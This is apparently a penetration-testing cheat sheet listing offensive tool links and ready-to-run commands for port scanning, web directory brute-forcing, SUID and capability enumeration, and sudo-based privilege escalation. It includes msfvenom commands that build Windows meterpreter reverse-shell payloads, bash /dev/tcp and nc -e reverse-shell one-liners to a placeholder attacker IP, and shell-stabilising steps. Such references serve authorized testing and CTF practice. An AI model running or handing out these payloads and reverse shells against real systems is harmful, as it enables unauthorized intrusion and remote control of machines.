[GTFOBins](https://gtfobins.github.io/), [LinSmartEnum](https://github.com/diego-treitos/linux-smart-enumeration), [LinEnum](https://github.com/rebootuser/LinEnum), [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS), [LinuxExploitSuggester](https://github.com/mzet-/linux-exploit-suggester)

[Sherlock](https://github.com/rasta-mouse/Sherlock), [impacket](https://github.com/SecureAuthCorp/impacket), [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)

----
## scan ports
```bash
# nmap scan allports, service/version info, script scan
nmap -T4 -sC -sV -p- --min-rate=1000 -oN <FILE> <IP> -Pn

# masscan all tcp ports
massscan -p1-65535 <IP>
```

## scan local network
```bash
nmap -sn 192.168.1.0/24
arp-scan 192.168.1.0/24
```

## find files
```bash
find / -iname <file>.txt 2>/dev/null # linux
dir <file>.txt /S /B # windows cmd
where /r C:\ <file>.txt
Get-ChildItem -Path C:\ -Filter <file>.txt -Recurse -ErrorAction SilentlyContinue -Force # windows powershell
```

## file/directory scan

```bash
gobuster dir -u <IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html --timeout 50s -t 170 -f -o gobsuter

# gobsuter scan php files
gobuster dir -u <IP> -w /SecLists/Discovery/Web-Content/raft-medium-words.txt -t 30 -x php

# gobuster scan directory
gobuster dir -u <IP> -w ~/usr/share/wordlists/dirb/big.txt -t 30
gobuster dir -u <IP> -w ~/SecLists/Discovery/Web-Content/raft-medium-words.txt -t 30
gobuster dir -u <IP> -w ~/SecLists/Discovery/Web-Content/raft-medium-directories.txt --timeout 7s -t 50 -f

# dirsearch
dirsearch -u <IP> -w <wordlist>

# ffuf 
ffuf -u <IP>/FUZZ -w <wordlist>
```

----
## potential priv-esc
```bash
# list allowed sudo commands
sudo -l

# list files capabilities
getcap -r / 2>/dev/null

# find suid / sgid files
find / -type f -perm -4001 -exec ls -h {} \; 2> /dev/null
find / -type f -perm -4000 -exec ls -l {} \; 2> /dev/null
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls  -l {} \; 2> /dev/null
```

## windows msfvenom payloads
```bash
# windows reverse shell
msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o payload.exe

# windows reverse shell uses exploit/multi/handler as listener
msfvenom -p windows/shell/reverse_tcp --platform=win --arch=x86 LHOST=<IP> LPORT=<PORT> -f exe -o payload.exe
```

## reverse shell
```bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1

/bin/bash -c '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'

nc -e /bin/bash <IP> <PORT>
```
## services
```bash
SNMP
- snmpwalk -v1 -c public <IP> 
```

## etc
```bash
# ssh with public_key
ssh <user>@<server> -i ~/.ssh/id_rsa

# tty shell
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl + z
stty raw -echo
fg
enter

# check shared objects 
strace <file> 2>&1

# if sudo su not allowed
sudo -s
sudo -i
sudo /bin/bash
sudo password

# metasploit migrate to diff process
migrate <process_id>
```
